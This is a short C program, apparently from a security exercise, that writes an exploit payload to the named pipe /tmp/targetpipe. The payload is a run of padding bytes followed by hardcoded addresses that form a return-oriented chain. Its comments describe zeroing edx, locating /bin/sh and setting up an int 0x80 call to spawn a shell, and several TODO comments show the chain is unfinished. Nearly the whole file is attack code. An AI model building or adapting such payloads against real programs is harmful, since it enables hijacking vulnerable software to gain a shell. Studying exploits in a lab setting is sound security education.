#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "util.h"

#define PIPEPATH "/tmp/targetpipe"

int main(void)
{
  writecmd(PIPEPATH, "\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09"
                      "\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09"
                      "\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09"
                      "\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09"
                      "\x09\x09\x09\x09"
                      "\x68\x07\xAD\xBB"
                      "\x8C\x9C\xA9\xBB\x8C\x9C\xA9\xBB\x8C\x9C\xA9\xBB\x8C\x9C\xA9\xBB\x8C\x9C\xA9\xBB\x8C\x9C\xA9\xBB\x8C\x9C\xA9\xBB\x8C\x9C\xA9\xBB\x8C\x9C\xA9\xBB\x8C\x9C\xA9\xBB\x8C\x9C\xA9\xBB\x8C\x9C\xA9\xBB\x8C\x9C\xA9\xBB\x8C\x9C\xA9\xBB"
                      "\xD4\xBE\xB3\xBB\xD5\x15\xAC\xBB"//\xCC\x9D\xB8\xBB"//\xD5\x15\xAC\xBB" // 0 out edx then add 4 to esp
                      "\xf6\xf6\xb7\xbb\xCC\x9D\xB8\xBB"//\x09\x09\x09\x09" // addy of /bin/sh and push edx (00000000) 
                      "\x68\x8B\xAA\xBB" // skip params on stack
                      "\xf6\xf6\xb7\xbb\xc8\x28\xbf\xbf\xcc\x28\xbf\xbf" // addy of bin/sh addy of y (above) addy of y + 4
                      "\xE5\xB6\xA9\xBB");
                      // TODO : move stack pointer to addy above, push edx to stack
                      // TODO : add addy of bin/sh to stack followed by addy above
                      // TODO : push edx to stack
                      // TODO : int 80
  
  return 0;
}
